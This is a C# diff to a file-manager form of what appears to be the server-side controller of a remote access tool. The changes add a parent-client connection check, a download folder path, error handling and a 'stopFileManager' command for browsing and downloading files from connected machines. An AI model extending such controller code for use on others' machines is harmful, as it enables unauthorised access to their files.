@@ -14,6 +14,7 @@ namespace Server.Forms
     public partial class FormFileManager : Form
     {
         public Form1 F { get; set; }
+        internal Clients ParentClient { get; set; }
         internal Clients Client { get; set; }
         public string FullPath { get; set; }
         public FormFileManager()
@@ -80,8 +81,8 @@ namespace Server.Forms
             {
                 if (listView1.SelectedItems.Count > 0)
                 {
-                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID)))
-                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID));
+                    if (!Directory.Exists(FullPath))
+                        Directory.CreateDirectory(FullPath);
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         if (itm.ImageIndex == 0 && itm.ImageIndex == 1 && itm.ImageIndex == 2) return;
@@ -101,7 +102,8 @@ namespace Server.Forms
                                 {
                                     Name = "socketDownload:" + dwid,
                                     Text = "socketDownload:" + Client.ID,
-                                    F = F
+                                    F = F,
+                                    FullPath = FullPath
                                 };
                                 SD.Show();
                             }
@@ -231,7 +233,7 @@ namespace Server.Forms
         {
             try
             {
-                if (!Client.TcpClient.Connected) this.Close();
+                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected) this.Close();
             }
             catch { this.Close(); }
         }
@@ -367,19 +369,20 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Path").AsString = "USER";
                 ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
-            catch
-            {
-
-            }
+            catch { }
         }
 
         private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "fileManager";
-            msgpack.ForcePathObject("Command").AsString = "getDrivers";
-            toolStripStatusLabel1.Text = "";
-            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "getDrivers";
+                toolStripStatusLabel1.Text = "";
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            }
+            catch { }
         }
 
         private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
@@ -389,6 +392,17 @@ namespace Server.Forms
                 if (!Directory.Exists(FullPath))
                     Directory.CreateDirectory(FullPath);
                 Process.Start(FullPath);
+            }
+            catch { }
+        }
+
+        private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Command").AsString = "stopFileManager";
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
             catch { }
         }
